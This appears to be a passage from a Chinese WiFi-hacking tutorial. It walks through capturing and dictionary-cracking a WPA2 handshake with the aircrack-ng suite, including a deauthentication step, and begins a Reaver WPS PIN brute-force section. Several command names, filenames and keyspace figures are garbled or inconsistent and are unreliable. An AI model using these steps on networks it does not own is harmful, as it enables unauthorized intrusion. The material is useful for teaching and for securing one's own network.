
### 第 5 步：采集握手

同时，在 `airdump-ng` 输出的右上角，你可能会看到类似的内容：
`WPA Handshake: 64:66:B3:6E:B0:8A`

| CH | Elapsed | s |
|---|---|---|
| 11 | 2017-07-13 | 02:01 |

| BSSID | PWR | Beacons | #Data | #s | CH | MB | ENC | CIPHER | AUTH | ESSID |
|---|---|---|---|---|---|---|---|---|---|---|
| 64:66:B3:6E:B0:8A | -470 | 119 | 13 | 2 | 11 | 54e. | WPA2 | CCMP | PSK | rootsh3ll |

| BSSID | STATION | PWR | Rate | Lost | Frames | Probe |
|---|---|---|---|---|---|---|
| 64:66:B3:6E:B0:8A | 2C:33:61:3A:C4:2F | -24 | 0e- | 24 | 30 | 46 | |

如果 `rootsh3ll` 是提供的 `-w` 参数文件名

### 第 6 步：握手检查

握手看起来像什么？打开 `Wireshark`（可选）
这一步是可选的，你可以在过滤器中输入 `eapol` 进行过滤。你会注意到最后一列，“Info”显示了从 1 到 4 的消息。

| No. | Source | Protocol | Destination | Info |
|---|---|---|---|---|
| 1 | 64:66:B3:6E:B0:8A | EAPOL | Apple_3a:c4:2F | Key (Message 1 of 4) |
| 2 | Apple_3a:c4:2F | EAPOL | 64:66:B3:6E:B0:8A | Key (Message 2 of 4) |
| 3 | 64:66:B3:6E:B0:8A | EAPOL | Apple_3a:c4:2F | Key (Message 3 of 4) |
| 4 | Apple_3a:c4:2F | EAPOL | 64:66:B3:6E:B0:8A | Key (Message 4 of 4) |

## 第 7 步：破解的残酷真相

> “一旦你获取了握手，破解密钥的几率取决于你的字典列表”
> - 一位合法的 WiFi 黑客

`WPA` 密码破解不像 `WEP` 那样具有确定性的，因为它基于可能单词的字典，而我们不知道口令是否在列表中。因此，你永远不确定特定的字典是否有效。
在本教程中，我有一个制作精美的字典，真的，它是一件艺术品！只是为了演示破解密码输出的样子。

命令和字典看起来如下：

```
echo "iamsh31" > dict

cat dict

iamrootsh31
```

`aircrack-ng rootsh331-01.cap -w .dict`
点 `.` 代表当前目录，正斜杠 `/` 表示目录内部（而非文件）。这意味着 `/dict` 意味着在当前目录（`.`）内部有一个名为 `dict` 的文件。

`aircrack-ng` 一次性破解了密码。

第一次看到破解出的口令感觉很奇怪，对吧？
这里是运行过程的示例输出，你在破解过程中看到的界面也会是一样的。

```
Aircrack-ng 1.2 rc4

[00:00:00] 1/0 keys tested (47.6 k/s) inf%

Time left: 0 seconds

KEY FOUND! [ iamrootsh331]

Master Key : 1F 4B 02 4C 82 F4 E0 2E 26 60 97 E7 BA D1 D1

92 83 6B 68 7F 08 4F 33 1D 8B 6C 49 88 4D 40

Transient Key : D9 E6 11 C6 F8 B0 DF 75 8D 75 53 ED 38 2F 8A 22

BA DA 5F 97 2C 6F 26 81 49 53 2B 45 78 7C 0C

56 98 2C E5 0D 64 99 04 E7 0C 1A 2C 27 D7 84

D9 50 98 E6 ED 40 94 84 BB C9 06 AA 55 35 FF 8F 4D 86
```

记得配置 alpha 卡时创建的 `wpa.conf` 文件吗？它的 `psk` 变量与 `aircrack-ng` 的 `Master Key` 匹配。这向我们证明了密钥已正确解密，因为我们已经知道了。

## 应对措施

使用强密码。不要成为那种人……

示例：`Myp@sword8@#` 是一个强密码
因为它具备：

- 1. 没有纯英语单词顺序
- 2. 13 位字符的密码，非常安全
- 3. 包含字母、数字和特殊字符，使得密码非常强。
- 4. 包含大和小写字母。
- 5. 无规律
- 6. 不是手机号，因为手机号很容易被猜。

![](img/ac8a7ada56be8fa0ece47a14bb6f46cd_74_0.png)

你只需要记住一个包含特殊字符、且既不是规律也不是字典单词的密码即可。

### 结论

我们学习了 `WPA` 破解涉及的过程。
以下是我们在抓获和破解过程中过的命令列表

```
airmon-ng check kill #杀死产生冲突的进程

airmon-ng start wlan0

airrodump-ng wlan0

airrodump-ng --bssid 64:66:B3:E0:B0:8A -c 11 wlan0 -w rootsh31

airplay-ng --death 5 -a 64:66:B3:E0:B0:8A wlan0

aircrack-ng rootsh31-01.cap dict #破解口令
```

目前 `WPA2` 的内容到此结束。
在下一章节中，我们将学习如何破解 `WPS`，以及为什么要破解 `WPS`？

## WPS 破解

### 什么是 WPS？

`WPS` 代表 Wi-Fi Protected Setup（Wi-Fi 保护设置），旨在让普通家庭用户设置安全的 `AP` 更简单。`WPS` 最初于 2006 年引入，但 2011 年被发现存在一个严重的设计缺陷。简单地使用 `Reaver` 等工具就可以暴力破解 `WPS PIN`。

### 什么是 Reaver？

`Reaver` 是一个免费的开源 `WPS` 破解工具，它利用无线路由器的安全漏洞，可以相对容易地破解启用 `WPS` 的路由当前密码。它预装在 `Kali Linux` 中，也可以通过代码安装在其他 Linux 发行版上。`Reaver` 对访问点的 Wi-Fi 保护设置 PIN 码进行暴力破解。一旦找到 `WPS` 码，就可以恢复 `WPS PSK`。

### 描述：

`Reaver-wps` 针对 Wi-Fi 保护设置配置强制要求的外部注册器功能。访问点会向真实的注册器提供其当前的无线配置（包括 `WPS PSK`），并接受来自注册处的新配置。

为了通过作为注册器的身份验证，注册处必须证明其知道 `AP` 的 8 位 `PIN` 码。注册处可以在任何时间向 `AP` 身份验证，而无需任何用户交互。由于 `WPS` 协议是通过 `EAP` 进行的，注册处只需要与 `AP` 关联，不需要对无线加密或配置有任何先验知识。

`Reaver` 对 `AP` 进行暴力破解，尝试每种可能的组合以猜测 `AP` 的 8 位 `PIN` 码。由于 `PIN` 码是数字，对于任何给定的 `PIN` 码，有 $10^8$（100,000,000-1=99,999,999）种可能值（考虑到 00,000,000 不是密钥）。然而，由于最后一位是可根据前 7 位计算出的校验和，密钥空间缩小到 $10^7$（10,000,000-1=9,999,999）种可能值，因为校验和为零。由于 `WPS` 协议将 `PIN` 码分成两半分别验证，密钥空间进一步缩小。这意味着 `PIN` 的前半部分有 $(10^4)-1=9999$ 种可能值，后半部分有 $(10^3)-1=999$ 种可能值。`Reaver` 强制破解 `PIN` 的前半部分，然后是后半部分，这意味着整个 `PIN` 的密钥空间完全取决于 `AP` 处理请求的速度。所有的 `AP` 都足够快，每秒都能测试 `PIN`；统计上讲，猜测正确的 `PIN` 需要一半的时间。

### 从源码安装 Reaver：

```
系统：Ubuntu/Debian

sudo apt-get install libpcap-dev sqlite3-dev

wget http://reaver-wps.google.com/files/reaver-1.4.tar.gz

tar xzvf reaver-1.4.tar.gz

cd reaver-1.4/src

./configure

make

sudo make install
```

如果你看了之前的教程，会知道必须将网卡设置为监听模式并开始扫描。

#### 第一步：开启监听模式

首先杀死可能导致问题的程序，然后我们将网卡进入监听模式。

```
sudo airmon-ng check kill
```
